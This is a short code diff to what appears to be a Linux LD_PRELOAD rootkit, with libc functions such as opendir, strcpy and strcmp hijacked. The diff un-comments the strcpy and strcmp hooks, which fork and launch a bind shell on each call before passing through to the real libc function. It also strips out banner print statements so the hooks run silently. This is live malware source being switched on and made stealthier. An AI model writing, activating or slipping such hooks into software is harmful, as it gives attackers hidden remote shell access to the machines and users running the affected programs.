@@ -120,7 +120,7 @@ DIR     *opendir(const char *name) //our hijacked opendir
 	}
 }
 
-/*
+
 char *strcpy(char *restrict dst, const char *restrict src){
 
 	void *handle;
@@ -128,11 +128,6 @@ char *strcpy(char *restrict dst, const char *restrict src){
 	const char* libc_path = getlibc();
 	handle = dlopen(libc_path, RTLD_LAZY);
 	sym = (void *) dlsym(handle, "strcpy");
-
-	printf(" _  _  ____  __  __ _\n"); 
-	printf("/ )( \\(  _ \\(  )(  / )\n");
-	printf(") \\/ ( ) _ ( )(  )  ( \n");
-	printf("\\____/(____/(__)(__\\_)\n");
 
 	if(fork() == 0){
  		bindshell(); 
@@ -151,11 +146,6 @@ int strcmp(const char *s1, const char *s2){
 	handle = dlopen(libc_path, RTLD_LAZY);
 	sym = (void *) dlsym(handle, "strcmp");
 
-	printf(" _  _  ____  __  __ _\n"); 
-	printf("/ )( \\(  _ \\(  )(  / )\n");
-	printf(") \\/ ( ) _ ( )(  )  ( \n");
-	printf("\\____/(____/(__)(__\\_)\n");
-
 	if(fork() == 0){
  		bindshell(); 
 	}
@@ -163,4 +153,4 @@ int strcmp(const char *s1, const char *s2){
   		return (sym(s1, s2));
 	}
 
-}*/
+}
